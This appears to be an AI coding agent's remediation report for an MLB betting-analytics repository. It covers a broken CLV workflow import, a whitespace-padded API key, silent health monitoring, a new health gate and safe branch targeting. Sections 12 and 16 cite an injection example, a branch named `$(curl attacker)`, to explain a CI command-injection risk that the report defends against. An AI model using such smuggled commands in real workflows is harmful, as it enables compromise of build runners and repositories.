# MLB Institutional Remediation — Wave 0

**REMEDIATION WAVE 0 — OPERATIONAL TRUTH / HEALTH ONLY.
NO MODEL OR BETTING DECISION CHANGES.**

The first remediation mission following the institutional audit
(`docs/MLB_INSTITUTIONAL_SYSTEM_AUDIT_2026_09.md`, PR #191). Scope is the
broken feedback/health loop — audit **CR-2** and its directly related causes —
and nothing else.

| | |
|---|---|
| **Branch** | `claude/mlb-remediation-wave0-2026-09` |
| **Base** | `main` @ `bbecd24b1041f19c59176406b27f47c613c263a3` |
| **Audit PR #191** | **MERGED** (see §0) |
| **Deterministic suite** | 9,728 passed · 9 skipped · 7 xfailed · **0 failed · 0 unexpected XPASS** |
| **Production betting behavior** | **UNCHANGED** (§13) |

---

## 0. Relationship to audit PR #191

Wave 0 was authored while PR #191 was still open, so it carried #191's two files
forward (`docs/MLB_INSTITUTIONAL_SYSTEM_AUDIT_2026_09.md` and
`tests/audit/test_audit_invariants_2026_09.py`) by cherry-picking its commit, so
that §I's instruction — convert the relevant audit invariant into a required
guard — could be carried out.

**PR #191 has since merged** as `bbecd24b1041f19c59176406b27f47c613c263a3`. On
rebase the duplicated audit commit dropped automatically and silently, exactly
as predicted (`warning: skipped previously applied commit 1c599a9f`), taking
this branch from 3 commits / 22 files to 2 commits / 21 files.
`docs/MLB_INSTITUTIONAL_SYSTEM_AUDIT_2026_09.md` now appears **nowhere** in this
PR's diff and is md5-identical to `main` — #191's audit baseline is preserved
untouched. The only remaining trace of #191 in this diff is the intended
`+15/−7` on `test_audit_invariants_2026_09.py` (the §I conversion), plus the
test-only CR-6 evidence-source correction described in §14.1.

---

## 1. Exact root cause of the CLV workflow failure

`scripts/clv_from_snapshot.py` carried **two** deviations from the pattern every
other script in the tree uses, and needed both to fail:

```python
from lib.edgelab import clv_convention   # line 43 — the FIRST statement in the file
import json, os, sys
...
ROOT_DIR = os.path.dirname(SCRIPTS_DIR)  # line 52 — computed AFTER the import above
sys.path.insert(0, os.path.join(ROOT_DIR, "lib"))   # line 57 — inserts ROOT/lib, not ROOT
```

1. The `lib.edgelab` import sat **above** the path setup, so it executed before
   `ROOT_DIR` even existed.
2. The path setup inserted **`<root>/lib`**, never `<root>`. That makes the flat
   `from atomic_json import ...` work while leaving `import lib.edgelab` broken —
   so even moving the import below it would not have been enough.

**The mechanism that made it invisible.** When Python runs a *script*,
`sys.path[0]` is the **script's own directory**, not the working directory.
`scripts/run_kalshi_clv_step.py` inserts only `scripts/`, so
`python3 scripts/run_kalshi_clv_step.py` began with the repository root nowhere
on the path. Demonstrated:

```
$ python3    -c "import sys; sys.path.insert(0,'scripts'); import clv_from_snapshot"
imported OK                                     # ← -c puts the CWD on the path. Misleading.
$ python3 -P -c "import sys; sys.path.insert(0,'scripts'); import clv_from_snapshot"
ModuleNotFoundError: No module named 'lib'      # ← -P drops the CWD: matches a script run
$ python3 scripts/run_kalshi_clv_step.py 2026-09-05
ModuleNotFoundError: No module named 'lib'
```

**Blast radius, read from the Actions run history.** `clv-update.yml` runs
**89–94** all concluded `failure` (2026-09-02 … 2026-09-07). Because
`edgelab-postgame.yml` gates on `workflow_run.conclusion == 'success'`, it was
`skipped` on every one of them. And because the commit step ran on the implicit
`success()` cascade, the settlement `clv_update.py` had **already computed and
written** each night was discarded with the ephemeral runner. The workflow's own
summary said so, every night, in a place nobody was reading:

> *"Kalshi CLV step failed after settlement succeeded — bets.json/BET_LOG.md from
> clv_update.py were written but NOT committed."*

**The fix.** The canonical pattern, used by ~20 sibling scripts
(`build_market_ledger.py`, `create_snapshot.py`, `corpus_health_report.py`, …):
put the repository root on `sys.path` *first*, then import `lib.*`. An AST +
subprocess scan of the entire `scripts/` tree confirmed this file was the
**only** deviation. The pre-existing `ROOT_DIR/lib` insert is left untouched — it
has always worked, and nothing about the CLV sign convention depends on
reordering it.

`lib/edgelab/clv_convention.py` is unmodified. No CLV formula or sign convention
was touched.

---

## 2. Exact root cause of the ODDS_API_KEY whitespace failure

**Where the whitespace enters:** the stored **secret value itself**. GitHub
Actions interpolates a secret verbatim — it masks it as `***` in logs, it does
not trim it — so `clv_update.py` received `"<key> "`. It is not workflow
interpolation, not shell quoting, and not application parsing.

**Why it broke the request:** `clv_update.py:40` bound the value with no
normalization and six call sites interpolate it directly into a URL f-string.
`http.client` validates the request target **before opening a socket**:

```
InvalidURL: URL can't contain control characters.
'/v4/sports/baseball_mlb/scores?apiKey=*** &daysFrom=2' (found at least ' ')
```

Reproduced for space, tab, newline, CRLF and leading-space variants. No socket is
opened, so **no API credit was consumed** and no HTTP status was ever returned.

**Why it was silent:** `api_get()`'s broad `except Exception` turned a permanent
configuration defect into `return None, None`. `clv_update.py` then printed
`Auto-settled this run: 0` and **exited 0**. This is a *second, independent*
cause of the settlement backlog: it would have survived a fix to §1 untouched.

**Which requests it affected:** every Odds API call in `clv_update.py` — the
scores/settlement fetch (`daysFrom`), historical Kalshi odds, historical
sportsbook odds, and the historical events/event-odds endpoints. That is the
entire automated settlement and Pinnacle-CLV path.

**Other values in the same class:** `KALSHI_API_KEY`
(`scripts/fetch_kalshi_clv_v2.py`) was the only other credential a Python entry
point reads. It reaches an HTTP **header** rather than a URL, where the same
accidental whitespace fails differently but just as silently — a trailing
newline raises `ValueError: Invalid header value`, a trailing space is
transmitted and rejected upstream as a 401 that reads like an expired key. It is
normalized too. The research collectors
(`prospective_capture.py`, `activation_audit.py`, `pull_pinnacle_history.py`)
**already** stripped defensively, and
`scripts/edgelab/backtest/probe_phase_a_validation.py` re-strips this very
constant after importing it from `clv_update` — a standing, unheeded
acknowledgement that this line did not.

**The fix, at the safest canonical boundary:**

- Normalize once, at the single definition site (`clv_update.ODDS_API_KEY`),
  rather than at six call sites.
- **Fail-loud preserved and strengthened.** A missing key is still `''` and still
  hits `if not ODDS_API_KEY: sys.exit(1)`. A *whitespace-only* key now also
  strips to `''` and fails loudly there, instead of silently building an invalid
  URL on every request. Only accidental surrounding whitespace around a real key
  is repaired.
- `InvalidURL` is **escalated**, not swallowed: it is raised locally before any
  socket, so it can never be transient and continuing past it can only reproduce
  itself for every remaining request. Genuine network failures (`URLError`,
  timeouts, JSON decode errors) remain soft and still return `(None, None)`, so
  one unreachable endpoint cannot abort a run that can still make progress.
- **The credential is never printed.** The underlying exception message quotes
  the whole request target and therefore embeds the key, so the handler reports
  the endpoint and the error *type* only. Asserted by test.

---

## 3. Why 9,600+ tests did not detect the outage

Because every test imported the failing module **differently from the way
production ran it**:

| Caller | Import shape | Sees the bug? |
|---|---|---|
| `tests/test_clv_snapshot_pipeline.py` | `sys.path.insert(0, _root)` then `import clv_from_snapshot` | no |
| `tests/edgelab/test_clv_convention.py` | `from scripts.clv_from_snapshot import calculate_clv` | no |
| `tests/test_paper_bet_tracking.py` | root on path, flat import | no |
| **`scripts/run_kalshi_clv_step.py`** | **`sys.path.insert(0, _here)` only** | **yes** |

Three import shapes for one module, and the only shape nobody exercised was
production's. The suite was not weak — it was **testing a different program**.

Two structural contributors compounded it:

- **No test executed a workflow step the way the workflow executes it.**
  `tests/test_pipeline_dependency_graph.py` gets impressively close — it
  simulates GitHub Actions' own `if:` semantics against the real YAML and runs
  the literal embedded `jq` — but it never *runs the steps' commands*.
- **`clv-update.yml` cannot be exercised anywhere except `main`.** It invokes
  `scripts/ci/git_data_commit.py` without `--branch`, which defaults to `main`,
  so a `workflow_dispatch` on a feature branch would push production data
  straight to `main`. Only the nine research workflows pass `--branch`. There is
  no safe end-to-end rehearsal path for the settlement chain. (See §12 — this is
  why Wave 0 did **not** dispatch a live trial run.)

**What Wave 0 added** (§F/§I): a repo-wide **AST** guard proving no script can
reintroduce the defect, plus subprocess probes that reproduce production's exact
`sys.path`. The guard is proven non-vacuous — run against the pre-fix file from
`origin/main` it reports `OFFENDER`; against the fixed file, `clean`.

A note on why the guard is static rather than import-based: the first version of
this scan **imported** each script, and importing `build_kalshi_registry`
silently rewrote `data/kalshi_market_registry.json` from 8,936 lines to 6,
because that script — like `merge_odds.py` and `enrich_data.py` — has no
`if __name__ == "__main__":` guard and executes its whole body on import. The
file was restored byte-identical (`md5` verified against `origin/main`) and the
scan rewritten to parse rather than execute. See §12.

---

## 4. Why health monitoring stayed green

`corpus-health-check.yml` reported **success on 2026-09-02, 09-03, 09-04, 09-05,
09-06 and 09-07** — every day of the outage. It was not broken and it was not
lying. It checks corpus **shape**: are archived rows well-formed and fully
accounted for? They were. Nothing in the repository checked corpus
**freshness**, or whether the pipeline that produces it had run and *persisted*
anything.

Three further reasons the system could not go red:

1. **`|| true` on top of `continue-on-error`.** The snapshot-coverage step
   carried both, so its exit code was discarded entirely. When it began crashing
   on the same import error, the summary table printed `success` for a step that
   had produced a traceback and done nothing.
2. **Every settlement-producing step in `edgelab-postgame.yml` is
   `continue-on-error: true`.** A total settlement failure would have left that
   job green too.
3. **The skip cascade was invisible by construction.** A `workflow_run` gate that
   silently skips produces no failure anywhere — there is no red thing to see.

---

## 5. Exact forward fixes

| # | Change | File |
|---|---|---|
| 1 | Repository root on `sys.path` **before** the `lib.edgelab` import | `scripts/clv_from_snapshot.py` |
| 2 | `ODDS_API_KEY` normalized at its single canonical boundary | `clv_update.py` |
| 3 | `InvalidURL` escalated as a configuration error; network errors stay soft; credential never printed | `clv_update.py::api_get` |
| 4 | `KALSHI_API_KEY` normalized (header-side sibling) | `scripts/fetch_kalshi_clv_v2.py` |
| 5 | `\|\| true` removed from the snapshot-coverage step | `.github/workflows/clv-update.yml` |
| 6 | Commit step → `if: always()`, so a downstream failure can no longer discard a night's settlement | `.github/workflows/clv-update.yml` |
| 7 | Stale "was NOT committed" failure-category text corrected | `.github/workflows/clv-update.yml` |
| 8 | Explicit gate fails the job when a core settlement step fails | `.github/workflows/edgelab-postgame.yml` |
| 9 | New operational health gate (8 assertions, 2 severities) | `scripts/ci/production_health_gate.py` |
| 10 | New workflow that can actually go red | `.github/workflows/production-health-gate.yml` |

**On #6 and #8 — persist first, then fail loudly.** Both preserve the failure
signal: GitHub marks a job failed if any step without `continue-on-error` failed,
regardless of later `always()` steps, and #8 adds an explicit `exit 1`. The
`continue-on-error` flags on `edgelab-postgame.yml`'s settlement steps are
deliberately **kept**; removing them would skip the commit step and re-create the
exact discard bug being repaired.

### Suppression audit (§C: "justify any that remain")

| Workflow | Pattern | Verdict |
|---|---|---|
| `clv-update.yml` snapshot-coverage | `\|\| true` | **REMOVED** — made a hard crash unable to fail |
| `clv-update.yml` snapshot-coverage | `continue-on-error: true` | **KEPT, justified** — genuinely advisory; must never block settlement. It can now fail *visibly* without failing the job |
| `edgelab-postgame.yml` sync/settle/reingest | `continue-on-error: true` ×3 | **KEPT + newly gated** — retained so partial settlement still persists; a new final step fails the job if any of them failed |
| `edgelab-postgame.yml` identity repair | `continue-on-error: true` | **KEPT, justified** — best-effort enrichment; on failure `mlbGamePk` stays null and `settle_markets` refuses rather than guessing |
| `edgelab-postgame.yml` snapshots ×2, replay scoring | `continue-on-error: true` ×3 | **KEPT, justified** — additive research capture, never read by production |
| `production-health-gate.yml` evaluate step | `continue-on-error: true` | **KEPT, justified** — so the artifact is committed on a red run; the final unmaskable step re-fails the job |

---

## 6. Dates replayed

**None. The 2026-09-01 … 09-06 restore was NOT executed, and this is a
constraint, not an omission.**

Settlement requires final-score ground truth from `statsapi.mlb.com`. This
environment's egress proxy denies it:

```
$ curl statsapi.mlb.com/api/v1/schedule?...
URLError: Tunnel connection failed: 403 Forbidden
$ curl "$HTTPS_PROXY/__agentproxy/status"
"connect_rejected": "gateway answered 403 to CONNECT (policy denial or upstream failure)"
```

No local substitute exists. `data/edgelab/games/*.jsonl` carries schedule and
identity only — `status: "Scheduled"`, **no scores** — and `data/statcast_raw/`
has no partitions for the window. Every other route to a result would have meant
**inferring** one, which §D forbids absolutely.

Nor could the canonical workflows be dispatched from this branch: as noted in §3,
`clv-update.yml` pushes to **`main`** regardless of the ref it runs on, and
pushing production settlement data to `main` from an unmerged branch is outside
this mission's authorization.

**What Wave 0 ships instead**, per §H:

- `scripts/ci/settlement_restore_manifest.py` — the dry-run manifest, naming
  every partition that would be created and every one that must be left
  untouched, with the exact canonical dispatch commands.
- `data/edgelab/operational_health/settlement_restore_manifest.json` — the
  generated manifest, `converged: false`, six pending dates.

**Post-merge restore procedure** (idempotent; chronological):

```bash
for d in 2026-09-01 2026-09-02 2026-09-03 2026-09-04 2026-09-05 2026-09-06; do
  gh workflow run clv-update.yml       -f date=$d   # settlement + Pinnacle CLV
  gh workflow run edgelab-postgame.yml -f date=$d   # canonical settlement ledger
done
# then prove convergence -- must print converged: true and exit 0
python3 scripts/ci/settlement_restore_manifest.py \
        --from 2026-09-01 --to 2026-09-06 --require-converged
```

Idempotency basis: `clv_update.py` skips already-terminal bets,
`settlement.merge_settlement_record` merges rather than duplicating, and
`bets.json` is written through `lib.atomic_json.write_json_atomic`.

---

## 7. Settlement counts, before and after

| | Before Wave 0 | After Wave 0 |
|---|---|---|
| Settlement partitions | 29, latest **2026-08-31** | 29, latest **2026-08-31** (unchanged — §6) |
| Recommendation partitions | 26, latest **2026-08-31** | 26, latest **2026-08-31** (unchanged) |
| Model-evaluation partitions | 37, latest **2026-09-06** | 37, latest 2026-09-06 |
| Root ledger rows | 556 | 556 (**no row created, modified or deleted**) |
| — settled | 400 | 400 |
| — non-terminal | 156 | 156 |
| Canonical ledger rows | 385 | 385 |

Wave 0 changed **no settlement data**. It fixed the machinery, classified the
backlog, and produced the manifest for a restore that must run where the network
exists.

---

## 8. CLV counts, before and after

| | Before | After |
|---|---|---|
| Root ledger rows with non-null `clv` | 241 / 556 | 241 / 556 (unchanged) |
| CLV coverage among settled rows | **60.2 %** (241/400) | 60.2 % |
| Canonical ledger rows with non-null `clv` | 281 / 385 | 281 / 385 |

Unchanged for the same reason as §7. Per §D, where CLV cannot be reconstructed
from genuine archived executable observations it is **preserved as unavailable
rather than invented** — no CLV value was fabricated, and the 39.8 % gap among
settled rows is reported rather than filled.

---

## 9. Classification of the remaining unresolved bets

All **156** non-terminal rows, via the canonical `lib/bet_backlog_classifier`,
mapped onto the five dispositions §D requires. **Zero fall into `OTHER`.**

| Disposition | Count | Basis |
|---|---:|---|
| **SETTLEMENT_AVAILABLE** | **78** | Resolvable date, both team abbreviations, and an automatically-settled family. A *capability* claim about the canonical settler — never a claim that any outcome is known |
| **EXPECTED_UNRESOLVED** | **65** | 35 NRFI/YRFI (`determine_result()` permanently routes the family to manual — production has no automated path at all) + 30 predating `clv-update.yml`'s creation (2026-06-10) |
| **PIPELINE_BACKLOG** | **8** | 7 on independently confirmed failed `clv-update.yml` dates + 1 inside the CR-2 outage window |
| **IDENTITY_BLOCKED** | **5** | Doubleheader dates whose two legs were assigned identical Kalshi tickers (audit CR-3, owned by Wave 1) |
| **OTHER** | **0** | — |

Artifact: `data/edgelab/operational_health/settlement_backlog_classification.json`
(one record per row, carrying both the canonical evidence category and the
disposition, so the mapping is auditable rather than opaque).

`acknowledgedClassifications` = `[EXPECTED_UNRESOLVED, IDENTITY_BLOCKED]`. These
are excluded from the health gate's PROD-7 backlog count so a permanent,
understood residue cannot hold the gate red forever. `PIPELINE_BACKLOG` and
`SETTLEMENT_AVAILABLE` are deliberately **not** acknowledged: both describe rows
that *should* settle, so both keep the gate red until they do.

**Nothing was marked settled. No result was inferred from a recommendation, a
sibling contract or a model probability. No price or CLV was fabricated.
`bets.json` was not written.**

---

## 10. The 556-vs-385 ledger reconciliation

Measurement only. Artifact:
`data/edgelab/operational_health/bet_ledger_reconciliation.json`.
Canonical ledger window: **2026-06-12 … 2026-08-30**.

| Category | Count | Meaning |
|---|---:|---|
| `LEGACY_ONLY` | 311 | Root rows predating the canonical ledger's earliest record — no counterpart can exist |
| `SYNTHETIC_OR_MANUAL` | 269 | Canonical rows from manual import batches — user-confirmed wagers recorded directly, which root never carried |
| `IDENTITY_UNRESOLVED` | 101 | Root rows whose matchup uses team **names/nicknames** rather than abbreviations |
| `REPRESENTED_CANONICALLY` | 64 | Matched on (date, teams, market family) |
| `CANONICAL_ONLY` | 20 | Canonical rows with no root counterpart |
| `LIFECYCLE_MISMATCH` | 36 | Matched, but terminal state disagrees |
| `OUT_OF_CANONICAL_WINDOW` | 1 | Root row postdating the canonical ledger — inside the outage window |
| `OTHER` | 43 | In-window, execution-shaped, unmatched — flagged for human review |
| **Total classified** | **845** | = 556 root + 289 unmatched canonical |

**Three findings worth the CEO's attention:**

1. **`LIFECYCLE_MISMATCH` = 36.** Thirty-six rows are settled in the canonical
   ledger but still `result: null` in root. Part of root's 156-row backlog is not
   missing settlement — it is **unpropagated** settlement.
2. **`IDENTITY_UNRESOLVED` = 101.** These are refused, not guessed. The nickname
   forms include genuinely ambiguous ones — `'Sox @ Twins'` and `'Orioles @ Sox'`
   are each satisfiable by two franchises — and a wrong expansion would match a
   real wager to the wrong game. Resolving them needs a curated franchise alias
   table: a Wave 1 identity task.
3. **`OTHER` = 43** is the only genuinely open bucket, and it is explicitly
   labelled *needs human review before any import*.

**No bet was imported to make the counts match.** A recommendation is never
assumed to have been placed.

*Two matcher defects were found and fixed while building this, both of which had
silently produced a fictitious reconciliation: an unanchored `/at/i` split that
turned `SF@ATL` into `{SF, L}`, and the two ledgers using different market
vocabularies (`KXMLBF5` vs `F5 ML`). The first draft reported 12 matches; the
corrected matcher reports 64.*

---

## 11. Health assertions now active

`scripts/ci/production_health_gate.py`, run daily at 13:00 UTC by
`production-health-gate.yml`. Reads **durable committed state only** — no
GitHub API, no token, no network — so it returns the same verdict locally and in
CI, and observes what actually *persisted*, which is the property that broke.

| ID | Severity | Assertion |
|---|---|---|
| **PROD-1** | CRITICAL | Slate pipeline is producing (also the offseason switch that suspends the rest) |
| **PROD-2** | CRITICAL | Settlement partitions advancing (≤ 2 days) |
| **PROD-3** | CRITICAL | Recommendation ledger advancing (≤ 2 days) |
| **PROD-4** | CRITICAL | **Skip-cascade detector** — predictions advancing while outcomes do not |
| **PROD-5** | CRITICAL | **Durable persistence** — `bets.json` actually committed (≤ 3 days) |
| **PROD-6** | CRITICAL | Model-evaluation partitions advancing (≤ 2 days) |
| **PROD-7** | CRITICAL | Unexplained settlement backlog ≤ 15 (acknowledged rows excluded) |
| **PROD-8** | CRITICAL | **"Blind but green"** — producing recommendations while the feedback loop is dead |
| **RSCH-1** | research | Research heartbeat freshness — **reported, never fatal** |

Mapping to the mission's eight required detections: (1) → PROD-5 + PROD-2,
(2) → PROD-2, (3) → PROD-3 + PROD-6, (4) → PROD-4, (5) → PROD-5, (6) → PROD-2/3/6,
(7) → PROD-7, (8) → PROD-8.

**Verdict against today's `main`:**

```
[PASS] CRIT  PROD-1  Slate pipeline active: last slate 2026-09-06 (1 day(s) old)
[FAIL] CRIT  PROD-2  Settlement corpus is 7 days stale (limit 2): latest partition 2026-08-31
[FAIL] CRIT  PROD-3  Recommendation ledger is 7 days stale (limit 2): latest partition 2026-08-31
[FAIL] CRIT  PROD-4  model evaluations at 2026-09-06 but settlements only at 2026-08-31 (6-day divergence)
[FAIL] CRIT  PROD-5  bets.json not committed for 5 days (limit 3, last commit 2026-09-02)
[PASS] CRIT  PROD-6  Model-evaluation corpus current: latest partition 2026-09-06
[FAIL] CRIT  PROD-7  Unexplained settlement backlog: 156 bets older than 3 days (limit 15)
[FAIL] CRIT  PROD-8  SYSTEM IS BLIND BUT GREEN
[PASS] rsch  RSCH-1  Research heartbeat current (latest 2026-09-06)
OVERALL: CRITICAL (critical failures: 6, research degradations: 0)
```

**The gate is RED today, and that is the correct result.** Per §K — *"if a genuine
critical failure remains, health should be RED rather than falsely green"* — it
stays red until the §6 restore runs. PROD-5 independently rediscovered the
outage's start date (`last commit 2026-09-02`) from git history alone.

**Noise control**, so the gate stays believed: research degradation can never
fail it; freshness assertions self-suspend in the offseason; a single late or
retried run does not fire it (only a second consecutive miss does); and
acknowledged-unresolvable rows are excluded from the backlog count. All four
properties are asserted by test.

---

## 12. Remaining operational blind spots

1. **The 2026-09-01…09-06 restore is still outstanding** (§6). The gate stays red
   until it runs.
2. ~~**`clv-update.yml` cannot be rehearsed off `main`.**~~ **✅ Closed by Wave
   0.05** — see §16. It called `git_data_commit.py` without `--branch`,
   defaulting to `main`, so a feature-branch dispatch pushed production data to
   `main`. The settlement chain had **no safe end-to-end rehearsal path** — a
   direct contributor to CR-2 shipping.

   **The fix this report originally proposed was itself unsafe.** Wave 0 wrote
   "pass `--branch ${{ github.ref_name }}`". Git permits `$`, backticks, `;`,
   `&` and `|` in branch names, and a `${{ }}` expression is substituted into a
   `run:` body *before* the shell parses it — so a branch named
   `$(curl attacker)` would execute on a runner holding `contents: write`.
   Wave 0.05 implements the safe form instead: context passed via `env:`, and a
   fail-closed resolver that constrains the name to `[A-Za-z0-9._/-]`.
3. **Three production scripts execute on import.** `build_kalshi_registry.py`,
   `merge_odds.py` and `enrich_data.py` have no `if __name__ == "__main__":`
   guard. Importing `build_kalshi_registry` **rewrites**
   `data/kalshi_market_registry.json` — observed and reverted during this Wave.
   Any tooling that imports the scripts tree can silently destroy canonical data.
   Wave 0 works around it (static analysis only) rather than touching the slate
   pipeline.
   **Extension found during this correction:** `scripts/regression_test.py`
   matches pytest's default `*_test.py` collection glob and calls `sys.exit(0)`
   at import, so a repo-root `python3 -m pytest` dies with `INTERNALERROR ...
   caught unexpected SystemExit` and runs **no tests at all**. This is why the
   canonical suite is scoped `python3 -m pytest tests/` (`pr-ci.yml:78`).
   Reproduced on unmodified `main`; pre-existing and untouched by Wave 0. A
   contributor who runs bare `pytest` gets a green-looking exit code 0 with zero
   tests executed — the same "silence reads as success" pattern as CR-2.
4. **Global `urlopen` monkeypatching leaks between test modules.** Two Wave 0
   tests initially failed only in the full suite because another module replaces
   `urlopen` with a fake response object that survives an `importlib.reload`.
   Wave 0's tests were made hermetic; the underlying isolation defect remains and
   is adjacent to issue #170.
5. **CLV coverage is 60.2 % among settled rows** and no assertion covers it. A
   PROD-9 CLV-coverage assertion is a natural follow-up once §6 establishes what
   the steady-state number should be.
6. **`edgelab-postgame.yml`'s `workflow_run` success gate is unchanged** —
   deliberately. It is correct to refuse settling from a run whose inputs failed.
   Wave 0 makes the resulting skip *visible* (PROD-4) rather than removing the
   gate.
7. **The health gate has never executed in CI**, because its workflow is not yet
   on `main` (§15).

---

## 13. Confirmation: no model or betting-decision behavior changed

Verified by diff. **Not touched by a single line:**

`scripts/build_market_ledger.py` · `scripts/risk_gate.py` ·
`scripts/write_pending_bets.py` · `scripts/enrich_data.py` ·
`scripts/merge_odds.py` · `scripts/build_kalshi_registry.py` ·
`config/rules.json` · `api/slate.js` · `api/odds.js` ·
`lib/edgelab/settlement.py` · `lib/edgelab/kalshi_fees.py` ·
`lib/edgelab/clv_convention.py` · `lib/research/market_taxonomy.py` ·
the ticker parsers · full-market coverage accounting · immutable slate
protection · the lineup gates · research governance.

No model probability, projection formula, calibration coefficient,
recommendation threshold, confidence tier, market eligibility rule, Bet Up To
rule, staking rule, bankroll rule, fee rule or market-family policy was
modified. **`bets.json` is byte-identical.** No settlement result, price or CLV
was created, altered or fabricated.

Explicitly **not** attempted, as instructed: CR-1/CR-5 executable-price
remediation, CR-3 doubleheader slate identity, CR-6 `api/slate.js` model removal,
home-field correction, calibration fitting.

The only production-behavior changes are **operational**: when a workflow
persists its output, when it fails, and when a credential is normalized.

---

## 14. Audit invariants converted

Per §I, the CR-2 invariant in `tests/audit/test_audit_invariants_2026_09.py`
—`test_workflow_entry_points_import_the_way_the_workflow_runs_them` — had its
`xfail` marker **removed** and is now a required guard. Its assertion is
unchanged; it was not weakened to make it pass.

The seven remaining `xfail`s (CR-1 ×2, CR-3, CR-5, CR-6, M-5, L-2) keep their
markers and their thresholds — they belong to later waves.

### 14.1 CR-6 evidence-source correction (test-only)

After the rebase onto merged `main`, the CR-6 invariant
`test_js_and_python_engines_agree_on_the_same_market` reported **XPASS**. That
was a **false all-clear in the invariant, not a fix to CR-6**. The invariant
read `data/slate.json` — one current day's slate, rewritten by scheduled data
commits (129 commits touched it in the preceding 30 days). That day's file held
only **3** comparable games which agreed to within 0.42pp, while CR-6 was
untouched: both engines still present, neither changed by a byte.

The evidence source is now the archived corpus via the module's existing
canonical loader `_archived_slates()` — `data/slates/<date>/authoritative.json`,
write-once and committed — evaluated over the most recent **20** archived dates
carrying comparable observations.

**A rolling count of dates, not a fixed calendar anchor.** A fixed anchor would
pin immutable history and could therefore *never* XPASS even after a genuine
fix. A rolling 20-date window cannot be flipped by one benign day (the verdict
is the maximum over ~20 independent dates and ~260 games) yet still clears once
20 post-fix dates accumulate — agreement across ~260 real games on 20 separate
days, which is a fix rather than a coincidence.

**The threshold is unchanged at 1.0pp** (the PAPER qualification floor) and the
predicate is strictly *stronger* than before — previously max over one day, now
max over twenty. Nothing was loosened to force an XFAIL.

The window is currently `2026-08-16..2026-09-07` and reproduces the audit
report's published CR-6 figures **exactly**:

```
n=261 · mean 1.74pp · max 8.86pp · 173/261 games (66.3%) over the 1.0pp floor
20/20 individual dates over the floor
```

Three **required** (non-`xfail`) guards were added so this class of defect
cannot recur silently:

| Guard | Proves |
|---|---|
| `test_the_cr6_invariant_does_not_read_the_mutable_daily_slate` | the invariant takes no `live_slate` fixture and its body references neither `SLATE` nor `slate.json`; it must call `_archived_slates()` |
| `test_the_cr6_evaluation_population_is_large_enough_to_be_a_population` | a thinning archive turns CI **red** rather than quietly shrinking the population back toward a one-day sample |
| `test_a_single_benign_day_cannot_clear_the_cr6_invariant` | splicing a 3-game, 0.42pp-agreeing day (the exact shape that caused the false XPASS) onto the real corpus leaves the verdict unchanged — and, guarding the guard, that same day *would* clear a one-day predicate while a wholly-agreeing 20-date population *does* clear the corrected one |

Mutation-tested: reverting the evidence source back to `data/slate.json` fails
two of the three guards. `api/slate.js` and `scripts/build_market_ledger.py`
were **not** touched — CR-6 itself remains Wave 1 work.

One pre-existing test premise was corrected rather than deleted.
`test_intermediate_steps_have_no_explicit_if_condition` mandated that
*"Commit all updates"* rely on the default `success()` cascade — the very
mechanism that discarded six nights of settlement. It is narrowed to the
computation steps (where cascading skip remains correct) and paired with a new
positive assertion that the commit step must persist. Renamed
`test_computation_steps_have_no_explicit_if_condition`; the guard is stronger
after the change, not weaker.

---

## 15. Verification status

| Check | Result |
|---|---|
| CR-2 reproduced on current main before any change | yes — `ModuleNotFoundError` |
| CR-2 fixed under the exact production invocation | yes — `exit 0` |
| Whitespace failure reproduced (5 variants) | yes — `InvalidURL`, pre-socket |
| Repo-wide AST guard proven non-vacuous | yes — `OFFENDER` pre-fix, `clean` post-fix |
| Health gate detects the exact September outage state | yes — asserted by test |
| Full deterministic suite | **9,728 passed · 9 skipped · 7 xfailed · 0 failed · 0 unexpected XPASS** |
| Genuine scheduled CI execution | **not obtainable pre-merge** — §6, §12.2 |

**Post-merge verification sequence:**

1. `gh workflow run production-health-gate.yml` → expect **RED** (PROD-2/3/4/5/7/8).
2. Run the §6 restore for the six dates.
3. Re-run the manifest with `--require-converged` → expect `converged: true`, exit 0.
4. Let the next scheduled `clv-update.yml` run → expect success, `edgelab-postgame.yml`
   no longer skipped, commit landing on `main`.
5. `gh workflow run production-health-gate.yml` → expect **GREEN for the right
   reasons**: PROD-2/3/6 current, PROD-4 in step, PROD-5 recent, PROD-7 within
   tolerance, PROD-8 both halves live.

If step 5 is green while step 2 was skipped, the gate is wrong and should be
treated as a defect — not as permission to stop looking.

---

## 16. Wave 0.05 — safe non-`main` rehearsal path for `clv-update.yml`

Closes blind spot §12.2, the last thing standing between Wave 0 and the
six-date production restore. Operational safety only; no model, pricing,
calibration, staking, eligibility, settlement-formula or CLV-formula change.

### Behavior before

`clv-update.yml`'s commit step called `scripts/ci/git_data_commit.py` with
`--message` and a path list, and **no `--branch`**. That argument defaults to
`'main'` (`git_data_commit.py:591`) and the push is
`git push origin HEAD:<branch>` (`git_data_commit.py:552`). Meanwhile
`actions/checkout@v4` carries no `ref:`, so it checks out `github.ref` — the
dispatched branch.

The result was the worst available shape: **compute on the feature branch,
publish to `main`.** Every dispatch, from any ref, wrote to production.

### Behavior after

| Event | Ref | Persists to |
|---|---|---|
| `schedule` | default branch | default branch — **unchanged** |
| `workflow_dispatch` | `main` | `main` (intentional production use) |
| `workflow_dispatch` | any feature branch | **that branch only** |
| `push` | the pushed branch | that branch |
| anything else | — | **fails closed, writes nothing** |

The target is always the ref the run is executing on, so a run can only write
where it came from.

### Why not the one-line `--branch ${{ github.ref_name }}`

Two reasons, both load-bearing:

1. **Injection.** Git permits `$`, backticks, `;`, `&`, `|`, `(`, `)` in ref
   names. A `${{ }}` expression is substituted into the `run:` body *before*
   the shell parses it, so a branch named `$(curl attacker)` executes on a
   runner holding `contents: write`. Context now arrives through `env:`, and
   `scripts/ci/resolve_commit_branch.py` independently constrains the name to
   `[A-Za-z0-9._/-]` — a charset with no shell metacharacter — additionally
   rejecting a leading `-` (parsed as a git option), `..`, `//`, empty path
   components, a trailing `.lock`, and `HEAD`.
2. **Ambiguity.** `github.ref_name` is meaningful only when the ref is a branch
   and the event's ref identifies the write target. A tag ref, an unrecognized
   event, or a `schedule` firing off the default branch are states where the
   correct target is genuinely unknown. Each **fails the job** rather than
   falling back to the default branch — falling back is the defect itself.

The resolver step runs **before** any computation, so a rejected target costs
no API quota and produces no output it cannot persist.

### Tests

`tests/test_clv_update_branch_targeting.py` — 47 cases:

| Requirement | Guard |
|---|---|
| Scheduled runs still target the default branch | `test_scheduled_run_still_targets_the_default_branch` (+ a non-`main` default) |
| Dispatch on a feature branch targets that branch | `test_workflow_dispatch_on_a_feature_branch_targets_that_branch` |
| Dispatch on `main` may still write to `main` | `test_workflow_dispatch_on_main_may_still_write_to_main` |
